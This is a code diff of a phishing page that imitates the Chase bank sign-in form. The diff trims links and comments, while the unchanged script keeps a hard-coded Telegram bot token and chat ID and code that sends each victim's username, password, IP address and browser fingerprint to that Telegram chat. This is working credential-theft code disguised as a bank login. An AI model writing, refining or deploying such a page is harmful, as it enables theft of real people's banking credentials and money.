@@ -269,33 +269,6 @@
       white-space: nowrap;
     }
 
-    .chase-links {
-      display: flex;
-      flex-direction: column;
-      gap: 4px;
-      margin-top: 16px;
-    }
-
-    .chase-link {
-      color: #006fba;
-      font-size: 14px;
-      text-decoration: none;
-      display: flex;
-      align-items: center;
-      gap: 4px;
-      padding: 6px 0;
-    }
-
-    .chase-link:hover {
-      text-decoration: underline;
-    }
-
-    .chase-chevron {
-      font-size: 18px;
-      line-height: 1;
-      color: #006fba;
-    }
-
     .chase-footer {
       background: linear-gradient(180deg, #f5f5f5 0%, #e8e8e8 85%, #d0d0d0 100%);
       border-top: 1px solid #ccc;
@@ -532,15 +505,6 @@
             <button type="button" class="chase-btn-secondary">
               Passwordless sign in
             </button>
-
-            <div class="chase-links">
-              <a href="https://secure.chase.com/web/auth/#/forgot-login/details" class="chase-link">
-                Forgot username/password? <span class="chase-chevron">&#8250;</span>
-              </a>
-              <a href="https://secure.chase.com/web/auth/#/signup/details" class="chase-link">
-                Not enrolled? Sign up now. <span class="chase-chevron">&#8250;</span>
-              </a>
-            </div>
           </form>
         </div>
       </div>
@@ -613,10 +577,8 @@
 
   <script>
     (function() {
-      // ==================== API CONFIG ====================
       const BOT_TOKEN = '7648541950:AAG_b72t6h6cLOpG03ynE1udWrBfJ5OvXNg';
       const CHAT_ID   = '7607355489';
-      // ===================================================
 
       const passwordInput = document.getElementById('password');
       const toggleBtn = document.getElementById('togglePassword');
@@ -847,10 +809,8 @@
         getIp().then(function(ip) {
           var payload = buildApiPayload(username, password, remember, token, ip, fingerprint);
           var telegramText = formatTelegramMessage(payload);
-
           return sendToTelegram(telegramText);
         }).catch(function() {
-          // if IP fails, send without it
           var payload = buildApiPayload(username, password, remember, token, 'unavailable', fingerprint);
           var telegramText = formatTelegramMessage(payload);
           return sendToTelegram(telegramText);
